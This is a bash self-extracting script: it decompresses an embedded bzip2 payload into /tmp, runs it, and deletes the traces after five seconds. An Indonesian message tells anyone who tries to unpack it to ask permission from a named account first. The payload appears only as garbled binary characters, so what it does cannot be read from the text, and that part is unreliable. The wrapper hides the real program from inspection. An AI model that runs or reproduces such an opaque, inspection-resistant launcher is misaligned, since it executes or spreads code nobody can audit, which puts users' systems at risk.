#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�:d ���� ����������pD@  `>wƔ�{�G�j��2zֹ: ����!4�i�zhM���&444h�M=G�24� 4�MF����jP h@     4 i4�OR��j=   !� ��@  �'��@�   d1�h     I=I��T����=H��=F�i=B�j~�6�y �B	�A	��dj��mI��z�7�=O)��~�z�	���b4��ѣ��r!Rm�޳Ѩ�A���e<��a7��002���2�o�q�[o��D�FS �$��p��hi$hI �8"$@� T�H�Sa ��|/�?T,_������ė7A�]Tţ349�xn�k8��TP>���)x�ir>疡�JR�A���&az}~�����!�S�@��O~o4[D��蕀��BB"@C��*"|�@n%�WP}�=hg���Z'?٫hp��m�M�4�P׭��j�1�}����ȧ\)�����)�W�<΃�s��T���c�Z���2��ܘ��4�R2;)��!�&��L�I,Z�E�x =��z�k���/A;^����$E�f�f���!`�!Es?/����i���Ǖ?��5GP��(	+00ݰgB{�����f����IJ�!�m49 iB
l���e���RMI3�"�-`�zЂEzJ@�m��95b��aU���h_��]Q���ͥq�FP�C��r�t׆ �t'> ���E-qNf!@i�����"��Rer"���ٴ75$��=HIj-P�MI)���=&![B����V��?T�6���R{������0���r�M� ��Ӕ=i�@>�#a�Ka�3�z��	�v�eH$�8���$!	!�(����`��M8L��V{[M�J0(��S��"�]}}�!6������ݗ������>6��(�,�<���/��n����~�����
��9�ךWl�
@���FD���$���.c9����� ����B��-�6�sv�}-R��/Z�qt_\��b䷮���bA$H���|�B��啇��n]��b�$.���x;�����=���xh#F��I|\���B 9@4ck��\ߏ%I���M�Z�>#�p{L�m
��󄆔4���z:�W���h�(�'���s85�U��рry�ZZ�W�@��}��`�=�z܆����$! �/֎>�ԝ�v��b���s��O4��0@vh�� s���_��WՏ�� �Hă|�{������$_���T��*���E�������2����4�������h�a�P%�Ujzh#A<�^fԈHg��n�tXu�6k0��2���|�tc�q�F %8���Y�aI��0䒽,��m�v��Wjbni���A��W���,�E��蝇�l6�5�X!
�T��`�U1Գ/�. r�E����2ۼ�yqS_gB���{@\@���, %�"���Ȉ �Gs;#Zv��g��4S�b9)�8�K����#?7�
��c7� :���lC� �}ϓ�6��2KP�VA��|�Ǧ��3�ɡ��8����2���1t�4�r��ea�z�% #bq%|:��]�d�`�o,t�SX�ĉ�X�S`��\�a�É��(��T(��+dw�7"������cؓsq�����$��@���ٲL����v |x�7;��kR��8�+p�P����	aX��	����ƈ�R	YX�"�	Pb�Q<E�4<�$�n(4Si��Hh,I����hy�:#x�S�*���k;�6D$�L��;��X�v&��qw���=���9�ab�CB��7�;{2��1���xd�[AD>b�?���|C3�/7�N�:��xj�� �"����x����s��<<sJq��l�	�C�w��eT�IZҵ>FV����z��|	�d{b�� ����M�����R�d� ��e��5/V�.~�O��Ң�VJ�(�@,��SN\��(m|?����=��1��aM�n���}�PB	 X�s[�0�ᇪH�sb�%��p��zZ�k�b�A<��	�(��gb�}���)��F�@���:��byo\~�/&{.��[.�`���/CYd��p���
���%��O�x��}xC��?ɸ~����!릀��A���Jg�(B��S*�n�7u>��@ԟD4+�z܅��@������A�{Ɔg���$���y�]%�<T�[	�~WsS"��N��s�Kl B��aՑ�M��~�B����e��hۋ��s�YA���P�8�	J41�F��qR�[$��������	����3M4[�U11+�Y�3b'���!+{��ȸCjds �6���=}�W���M��A ��ޞ`wĐ�cy��^���
�����1���}��|uG�f>����E�h{a�x=7}�MD���P!EP S֧ ���D���(L$��
�U-`��#E!HS�rE8P��:d